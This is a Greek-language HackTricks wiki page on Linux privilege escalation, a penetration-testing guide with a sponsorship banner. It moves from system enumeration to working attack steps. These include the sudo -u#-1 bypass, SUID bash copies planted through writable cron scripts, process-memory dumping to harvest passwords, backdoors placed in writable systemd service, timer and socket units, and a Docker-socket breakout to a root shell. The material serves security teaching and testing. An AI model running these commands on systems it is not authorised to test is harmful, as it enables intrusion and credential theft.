# Linux Privilege Escalation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## System Information

### OS info

Ας αρχίσουμε να αποκτούμε κάποιες γνώσεις για το λειτουργικό σύστημα που εκτελείται
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Αν έχετε **δικαιώματα εγγραφής σε οποιονδήποτε φάκελο μέσα στη μεταβλητή `PATH`** μπορεί να είστε σε θέση να υποκλέψετε κάποιες βιβλιοθήκες ή δυαδικά αρχεία:
```bash
echo $PATH
```
### Env info

Ενδιαφέρουσες πληροφορίες, κωδικοί πρόσβασης ή κλειδιά API στις μεταβλητές περιβάλλοντος;
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Ελέγξτε την έκδοση του πυρήνα και αν υπάρχει κάποια εκμετάλλευση που μπορεί να χρησιμοποιηθεί για την κλιμάκωση των δικαιωμάτων.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Μπορείτε να βρείτε μια καλή λίστα ευάλωτων πυρήνων και μερικούς ήδη **compiled exploits** εδώ: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) και [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
Άλλες τοποθεσίες όπου μπορείτε να βρείτε μερικούς **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Για να εξαγάγετε όλες τις ευάλωτες εκδόσεις πυρήνα από αυτή την ιστοσελίδα μπορείτε να κάνετε:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Τα εργαλεία που θα μπορούσαν να βοηθήσουν στην αναζήτηση εκμεταλλεύσεων πυρήνα είναι:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (εκτέλεση ΣΤΟ θύμα, ελέγχει μόνο εκμεταλλεύσεις για πυρήνα 2.x)

Πάντα **αναζητήστε την έκδοση του πυρήνα στο Google**, ίσως η έκδοση του πυρήνα σας να είναι γραμμένη σε κάποια εκμετάλλευση πυρήνα και τότε θα είστε σίγουροι ότι αυτή η εκμετάλλευση είναι έγκυρη.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo version

Βασισμένο στις ευάλωτες εκδόσεις sudo που εμφανίζονται σε:
```bash
searchsploit sudo
```
Μπορείτε να ελέγξετε αν η έκδοση του sudo είναι ευάλωτη χρησιμοποιώντας αυτό το grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Από @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg υπογραφή επαλήθευσης απέτυχε

Ελέγξτε το **smasher2 box of HTB** για ένα **παράδειγμα** του πώς αυτή η ευπάθεια θα μπορούσε να εκμεταλλευτεί
```bash
dmesg 2>/dev/null | grep "signature"
```
### Περισσότερη αρίθμηση συστήματος
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Καταμέτρηση πιθανών αμυνών

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Αν βρίσκεστε μέσα σε ένα docker container, μπορείτε να προσπαθήσετε να ξεφύγετε από αυτό:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Drives

Ελέγξτε **τι είναι τοποθετημένο και αποτοποθετημένο**, πού και γιατί. Αν κάτι είναι αποτοποθετημένο, μπορείτε να προσπαθήσετε να το τοποθετήσετε και να ελέγξετε για ιδιωτικές πληροφορίες.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Χρήσιμο λογισμικό

Καταγράψτε χρήσιμα δυαδικά αρχεία
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Επίσης, ελέγξτε αν **είναι εγκατεστημένος οποιοσδήποτε μεταγλωττιστής**. Αυτό είναι χρήσιμο αν χρειαστεί να χρησιμοποιήσετε κάποιο kernel exploit, καθώς συνιστάται να το μεταγλωττίσετε στη μηχανή όπου θα το χρησιμοποιήσετε (ή σε μία παρόμοια).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Ευάλωτο Λογισμικό Εγκατεστημένο

Check for the **version of the installed packages and services**. Maybe there is some old Nagios version (for example) that could be exploited for escalating privileges…\
It is recommended to check manually the version of the more suspicious installed software.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Αν έχετε πρόσβαση SSH στη μηχανή, μπορείτε επίσης να χρησιμοποιήσετε **openVAS** για να ελέγξετε για παρωχημένο και ευάλωτο λογισμικό που είναι εγκατεστημένο στη μηχανή.

{% hint style="info" %}
_Σημειώστε ότι αυτές οι εντολές θα δείξουν πολλές πληροφορίες που θα είναι κυρίως άχρηστες, επομένως συνιστάται κάποιες εφαρμογές όπως το OpenVAS ή παρόμοιες που θα ελέγξουν αν κάποια εγκατεστημένη έκδοση λογισμικού είναι ευάλωτη σε γνωστά exploits_
{% endhint %}

## Διαδικασίες

Ρίξτε μια ματιά σε **ποιες διαδικασίες** εκτελούνται και ελέγξτε αν κάποια διαδικασία έχει **περισσότερα δικαιώματα από ό,τι θα έπρεπε** (ίσως μια tomcat που εκτελείται από τον root;)
```bash
ps aux
ps -ef
top -n 1
```
Πάντα να ελέγχετε για πιθανές [**electron/cef/chromium debuggers** που τρέχουν, μπορείτε να το εκμεταλλευτείτε για να ανεβάσετε δικαιώματα](electron-cef-chromium-debugger-abuse.md). **Linpeas** ανιχνεύουν αυτά ελέγχοντας την παράμετρο `--inspect` μέσα στη γραμμή εντολών της διαδικασίας.\
Επίσης **ελέγξτε τα δικαιώματά σας πάνω στα δυαδικά αρχεία των διαδικασιών**, ίσως μπορείτε να αντικαταστήσετε κάποιον.

### Παρακολούθηση διαδικασιών

Μπορείτε να χρησιμοποιήσετε εργαλεία όπως το [**pspy**](https://github.com/DominicBreuker/pspy) για να παρακολουθείτε διαδικασίες. Αυτό μπορεί να είναι πολύ χρήσιμο για να εντοπίσετε ευάλωτες διαδικασίες που εκτελούνται συχνά ή όταν πληρούνται ένα σύνολο απαιτήσεων.

### Μνήμη διαδικασίας

Ορισμένες υπηρεσίες ενός διακομιστή αποθηκεύουν **διαπιστευτήρια σε καθαρό κείμενο μέσα στη μνήμη**.\
Κανονικά θα χρειαστείτε **δικαιώματα root** για να διαβάσετε τη μνήμη διαδικασιών που ανήκουν σε άλλους χρήστες, επομένως αυτό είναι συνήθως πιο χρήσιμο όταν είστε ήδη root και θέλετε να ανακαλύψετε περισσότερα διαπιστευτήρια.\
Ωστόσο, θυμηθείτε ότι **ως κανονικός χρήστης μπορείτε να διαβάσετε τη μνήμη των διαδικασιών που κατέχετε**.

{% hint style="warning" %}
Σημειώστε ότι σήμερα οι περισσότερες μηχανές **δεν επιτρέπουν το ptrace από προεπιλογή**, που σημαίνει ότι δεν μπορείτε να αποθηκεύσετε άλλες διαδικασίες που ανήκουν στον μη προνομιούχο χρήστη σας.

Το αρχείο _**/proc/sys/kernel/yama/ptrace\_scope**_ ελέγχει την προσβασιμότητα του ptrace:

* **kernel.yama.ptrace\_scope = 0**: όλες οι διαδικασίες μπορούν να αποσφαλματωθούν, εφόσον έχουν το ίδιο uid. Αυτός είναι ο κλασικός τρόπος με τον οποίο λειτουργούσε το ptracing.
* **kernel.yama.ptrace\_scope = 1**: μόνο μια γονική διαδικασία μπορεί να αποσφαλματωθεί.
* **kernel.yama.ptrace\_scope = 2**: Μόνο ο διαχειριστής μπορεί να χρησιμοποιήσει το ptrace, καθώς απαιτεί την ικανότητα CAP\_SYS\_PTRACE.
* **kernel.yama.ptrace\_scope = 3**: Καμία διαδικασία δεν μπορεί να παρακολουθηθεί με ptrace. Μόλις ρυθμιστεί, απαιτείται επανεκκίνηση για να ενεργοποιηθεί ξανά το ptracing.
{% endhint %}

#### GDB

Αν έχετε πρόσβαση στη μνήμη μιας υπηρεσίας FTP (για παράδειγμα) θα μπορούσατε να αποκτήσετε το Heap και να αναζητήσετε μέσα στα διαπιστευτήριά της.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script

{% code title="dump-memory.sh" %}
```bash
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
{% endcode %}

#### /proc/$pid/maps & /proc/$pid/mem

Για μια δεδομένη ταυτότητα διαδικασίας, **οι χάρτες δείχνουν πώς είναι χαρτογραφημένη η μνήμη μέσα στον εικονικό χώρο διευθύνσεων αυτής της διαδικασίας**; δείχνει επίσης τις **άδειες κάθε χαρτογραφημένης περιοχής**. Το **mem** ψευδοαρχείο **εκθέτει τη μνήμη των διαδικασιών**. Από το αρχείο **maps** γνωρίζουμε ποιες **περιοχές μνήμης είναι αναγνώσιμες** και τους μετατοπιστές τους. Χρησιμοποιούμε αυτές τις πληροφορίες για να **αναζητήσουμε στο αρχείο mem και να εξάγουμε όλες τις αναγνώσιμες περιοχές** σε ένα αρχείο.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` παρέχει πρόσβαση στη **φυσική** μνήμη του συστήματος, όχι στη εικονική μνήμη. Ο εικονικός χώρος διευθύνσεων του πυρήνα μπορεί να προσπελαστεί χρησιμοποιώντας το /dev/kmem.\
Τυπικά, το `/dev/mem` είναι αναγνώσιμο μόνο από τον **root** και την ομάδα **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump για linux

Το ProcDump είναι μια επαναστατική έκδοση του κλασικού εργαλείου ProcDump από τη σουίτα εργαλείων Sysinternals για Windows. Μπορείτε να το βρείτε στο [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Εργαλεία

Για να εξάγετε τη μνήμη μιας διαδικασίας, μπορείτε να χρησιμοποιήσετε:

* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Μπορείτε να αφαιρέσετε χειροκίνητα τις απαιτήσεις root και να εξάγετε τη διαδικασία που ανήκει σε εσάς
* Script A.5 από [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (απαιτείται root)

### Διαπιστευτήρια από τη Μνήμη Διαδικασίας

#### Χειροκίνητο παράδειγμα

Εάν διαπιστώσετε ότι η διαδικασία αυθεντικοποίησης εκτελείται:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Μπορείτε να εκτελέσετε dump τη διαδικασία (δείτε τις προηγούμενες ενότητες για να βρείτε διάφορους τρόπους για να εκτελέσετε dump τη μνήμη μιας διαδικασίας) και να αναζητήσετε διαπιστευτήρια μέσα στη μνήμη:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Το εργαλείο [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) θα **κλέψει καθαρές πιστοποιήσεις από τη μνήμη** και από κάποια **γνωστά αρχεία**. Απαιτεί δικαιώματα root για να λειτουργήσει σωστά.

| Χαρακτηριστικό                                    | Όνομα Διαδικασίας     |
| ------------------------------------------------- | -------------------- |
| Κωδικός GDM (Kali Desktop, Debian Desktop)        | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Ενεργές Συνδέσεις FTP)                   | vsftpd               |
| Apache2 (Ενεργές Συνεδρίες HTTP Basic Auth)      | apache2              |
| OpenSSH (Ενεργές Συνεδρίες SSH - Χρήση Sudo)     | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

Ελέγξτε αν κάποια προγραμματισμένη εργασία είναι ευάλωτη. Ίσως μπορείτε να εκμεταλλευτείτε ένα σενάριο που εκτελείται από τον root (ευπάθεια wildcard; μπορεί να τροποποιήσει αρχεία που χρησιμοποιεί ο root; χρησιμοποιήστε symlinks; δημιουργήστε συγκεκριμένα αρχεία στον κατάλογο που χρησιμοποιεί ο root;).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Για παράδειγμα, μέσα στο _/etc/crontab_ μπορείτε να βρείτε το PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Σημειώστε πώς ο χρήστης "user" έχει δικαιώματα εγγραφής στο /home/user_)

Αν μέσα σε αυτό το crontab ο χρήστης root προσπαθήσει να εκτελέσει κάποια εντολή ή σενάριο χωρίς να ορίσει το path. Για παράδειγμα: _\* \* \* \* root overwrite.sh_\
Τότε, μπορείτε να αποκτήσετε ένα root shell χρησιμοποιώντας:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron χρησιμοποιώντας ένα σενάριο με wildcard (Wildcard Injection)

Εάν ένα σενάριο που εκτελείται από τον root έχει ένα “**\***” μέσα σε μια εντολή, θα μπορούσατε να το εκμεταλλευτείτε για να κάνετε απροσδόκητα πράγματα (όπως privesc). Παράδειγμα:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Αν το wildcard προηγείται από μια διαδρομή όπως** _**/some/path/\***_ **, δεν είναι ευάλωτο (ούτε** _**./\***_ **είναι).**

Διαβάστε την παρακάτω σελίδα για περισσότερα κόλπα εκμετάλλευσης wildcard:

{% content-ref url="wildcards-spare-tricks.md" %}
[wildcards-spare-tricks.md](wildcards-spare-tricks.md)
{% endcontent-ref %}

### Επικάλυψη script cron και symlink

Αν **μπορείτε να τροποποιήσετε ένα script cron** που εκτελείται από τον root, μπορείτε να αποκτήσετε ένα shell πολύ εύκολα:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Αν το σενάριο που εκτελείται από τον root χρησιμοποιεί έναν **φάκελο όπου έχετε πλήρη πρόσβαση**, ίσως θα ήταν χρήσιμο να διαγράψετε αυτόν τον φάκελο και **να δημιουργήσετε έναν φάκελο symlink σε έναν άλλο** που εξυπηρετεί ένα σενάριο που ελέγχετε εσείς.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Συχνές cron εργασίες

Μπορείτε να παρακολουθήσετε τις διαδικασίες για να αναζητήσετε διαδικασίες που εκτελούνται κάθε 1, 2 ή 5 λεπτά. Ίσως μπορείτε να εκμεταλλευτείτε αυτό και να κλιμακώσετε τα προνόμια.

Για παράδειγμα, για να **παρακολουθήσετε κάθε 0.1s κατά τη διάρκεια 1 λεπτού**, **ταξινομήστε κατά λιγότερες εκτελεσμένες εντολές** και διαγράψτε τις εντολές που έχουν εκτελεστεί περισσότερο, μπορείτε να κάνετε:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Μπορείτε επίσης να χρησιμοποιήσετε** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (αυτό θα παρακολουθεί και θα καταγράφει κάθε διαδικασία που ξεκινά).

### Αόρατα cron jobs

Είναι δυνατόν να δημιουργήσετε ένα cronjob **βάζοντας έναν χαρακτήρα επιστροφής καροτσιού μετά από ένα σχόλιο** (χωρίς χαρακτήρα νέας γραμμής), και το cron job θα λειτουργήσει. Παράδειγμα (σημειώστε τον χαρακτήρα επιστροφής καροτσιού):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Υπηρεσίες

### Γράψιμα _.service_ αρχεία

Ελέγξτε αν μπορείτε να γράψετε οποιοδήποτε `.service` αρχείο, αν μπορείτε, θα **μπορούσατε να το τροποποιήσετε** ώστε να **εκτελεί** το **backdoor σας όταν** η υπηρεσία είναι **ξεκινά**, **επανεκκινείται** ή **σταματά** (ίσως χρειαστεί να περιμένετε μέχρι να επανεκκινήσει η μηχανή).\
Για παράδειγμα, δημιουργήστε το backdoor σας μέσα στο .service αρχείο με **`ExecStart=/tmp/script.sh`**

### Γράψιμα δυαδικά αρχεία υπηρεσιών

Λάβετε υπόψη ότι αν έχετε **δικαιώματα εγγραφής σε δυαδικά αρχεία που εκτελούνται από υπηρεσίες**, μπορείτε να τα αλλάξετε με backdoors ώστε όταν οι υπηρεσίες εκτελούνται ξανά, τα backdoors να εκτελούνται.

### systemd PATH - Σχετικές Διαδρομές

Μπορείτε να δείτε το PATH που χρησιμοποιεί το **systemd** με:
```bash
systemctl show-environment
```
Αν διαπιστώσετε ότι μπορείτε να **γράφετε** σε οποιονδήποτε από τους φακέλους της διαδρομής, μπορεί να είστε σε θέση να **κλιμακώσετε τα δικαιώματα**. Πρέπει να αναζητήσετε **σχετικές διαδρομές που χρησιμοποιούνται σε αρχεία ρυθμίσεων υπηρεσιών** όπως:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Τότε, δημιουργήστε ένα **executable** με το **ίδιο όνομα όπως το σχετικό διαδρομή binary** μέσα στον φάκελο PATH του systemd που μπορείτε να γράψετε, και όταν ζητηθεί από την υπηρεσία να εκτελέσει την ευάλωτη ενέργεια (**Start**, **Stop**, **Reload**), η **πίσω πόρτα σας θα εκτελείται** (οι μη προνομιούχοι χρήστες συνήθως δεν μπορούν να ξεκινήσουν/σταματήσουν υπηρεσίες αλλά ελέγξτε αν μπορείτε να χρησιμοποιήσετε `sudo -l`).

**Μάθετε περισσότερα για τις υπηρεσίες με `man systemd.service`.**

## **Timers**

**Timers** είναι αρχεία μονάδας systemd των οποίων το όνομα τελειώνει σε `**.timer**` που ελέγχουν τα αρχεία `**.service**` ή τα γεγονότα. **Timers** μπορούν να χρησιμοποιηθούν ως εναλλακτική λύση στο cron καθώς έχουν ενσωματωμένη υποστήριξη για γεγονότα ημερολογιακού χρόνου και μονοτονικού χρόνου και μπορούν να εκτελούνται ασύγχρονα.

Μπορείτε να απαριθμήσετε όλους τους χρονοδιακόπτες με:
```bash
systemctl list-timers --all
```
### Writable timers

Αν μπορείτε να τροποποιήσετε έναν χρονοδιακόπτη, μπορείτε να τον κάνετε να εκτελεί κάποιες υπάρχουσες μονάδες του systemd (όπως ένα `.service` ή ένα `.target`)
```bash
Unit=backdoor.service
```
Στην τεκμηρίωση μπορείτε να διαβάσετε τι είναι η Μονάδα:

> Η μονάδα που θα ενεργοποιηθεί όταν λήξει αυτός ο χρονοδιακόπτης. Το επιχείρημα είναι ένα όνομα μονάδας, του οποίου το επίθημα δεν είναι ".timer". Αν δεν καθοριστεί, αυτή η τιμή προεπιλέγεται σε μια υπηρεσία που έχει το ίδιο όνομα με τη μονάδα χρονοδιακόπτη, εκτός από το επίθημα. (Δείτε παραπάνω.) Συνιστάται το όνομα της μονάδας που ενεργοποιείται και το όνομα της μονάδας χρονοδιακόπτη να είναι ονομασμένα ταυτόχρονα, εκτός από το επίθημα.

Επομένως, για να εκμεταλλευτείτε αυτήν την άδεια θα χρειαστεί να:

* Βρείτε κάποια μονάδα systemd (όπως μια `.service`) που **εκτελεί ένα εγγράψιμο δυαδικό**
* Βρείτε κάποια μονάδα systemd που **εκτελεί μια σχετική διαδρομή** και έχετε **δικαιώματα εγγραφής** πάνω στη **διαδρομή systemd** (για να προσποιηθείτε ότι είστε αυτή η εκτελέσιμη)

**Μάθετε περισσότερα για τους χρονοδιακόπτες με `man systemd.timer`.**

### **Ενεργοποίηση Χρονοδιακόπτη**

Για να ενεργοποιήσετε έναν χρονοδιακόπτη χρειάζεστε δικαιώματα root και να εκτελέσετε:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) enable **process communication** on the same or different machines within client-server models. They utilize standard Unix descriptor files for inter-computer communication and are set up through `.socket` files.

Sockets can be configured using `.socket` files.

**Learn more about sockets with `man systemd.socket`.** Inside this file, several interesting parameters can be configured:

* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Αυτές οι επιλογές είναι διαφορετικές αλλά χρησιμοποιείται μια σύνοψη για να **υποδείξει πού θα ακούσει** το socket (η διαδρομή του αρχείου socket AF_UNIX, το IPv4/6 και/ή τον αριθμό θύρας για να ακούσει, κ.λπ.)
* `Accept`: Takes a boolean argument. If **true**, a **service instance is spawned for each incoming connection** and only the connection socket is passed to it. If **false**, all listening sockets themselves are **passed to the started service unit**, and only one service unit is spawned for all connections. This value is ignored for datagram sockets and FIFOs where a single service unit unconditionally handles all incoming traffic. **Defaults to false**. For performance reasons, it is recommended to write new daemons only in a way that is suitable for `Accept=no`.
* `ExecStartPre`, `ExecStartPost`: Takes one or more command lines, which are **executed before** or **after** the listening **sockets**/FIFOs are **created** and bound, respectively. The first token of the command line must be an absolute filename, then followed by arguments for the process.
* `ExecStopPre`, `ExecStopPost`: Additional **commands** that are **executed before** or **after** the listening **sockets**/FIFOs are **closed** and removed, respectively.
* `Service`: Specifies the **service** unit name **to activate** on **incoming traffic**. This setting is only allowed for sockets with Accept=no. It defaults to the service that bears the same name as the socket (with the suffix replaced). In most cases, it should not be necessary to use this option.

### Writable .socket files

If you find a **writable** `.socket` file you can **add** at the beginning of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**\
&#xNAN;_&#x4E;ote that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

If you **identify any writable socket** (_now we are talking about Unix Sockets and not about the config `.socket` files_), then **you can communicate** with that socket and maybe exploit a vulnerability.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Ακατέργαστη σύνδεση
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Παράδειγμα εκμετάλλευσης:**

{% content-ref url="socket-command-injection.md" %}
[socket-command-injection.md](socket-command-injection.md)
{% endcontent-ref %}

### HTTP sockets

Σημειώστε ότι μπορεί να υπάρχουν **sockets που ακούν για HTTP** αιτήματα (_Δεν μιλάω για .socket αρχεία αλλά για τα αρχεία που λειτουργούν ως unix sockets_). Μπορείτε να το ελέγξετε με:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Αν το socket **απαντήσει με ένα HTTP** αίτημα, τότε μπορείτε να **επικοινωνήσετε** μαζί του και ίσως να **εκμεταλλευτείτε κάποια ευπάθεια**.

### Γράψιμο Docker Socket

Το Docker socket, που συχνά βρίσκεται στο `/var/run/docker.sock`, είναι ένα κρίσιμο αρχείο που θα πρέπει να ασφαλίζεται. Από προεπιλογή, είναι γράψιμο από τον χρήστη `root` και τα μέλη της ομάδας `docker`. Η κατοχή δικαιωμάτων εγγραφής σε αυτό το socket μπορεί να οδηγήσει σε κλιμάκωση δικαιωμάτων. Ακολουθεί μια ανάλυση του πώς μπορεί να γίνει αυτό και εναλλακτικές μέθοδοι αν η Docker CLI δεν είναι διαθέσιμη.

#### **Κλιμάκωση Δικαιωμάτων με Docker CLI**

Αν έχετε δικαιώματα εγγραφής στο Docker socket, μπορείτε να κλιμακώσετε τα δικαιώματα χρησιμοποιώντας τις παρακάτω εντολές:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
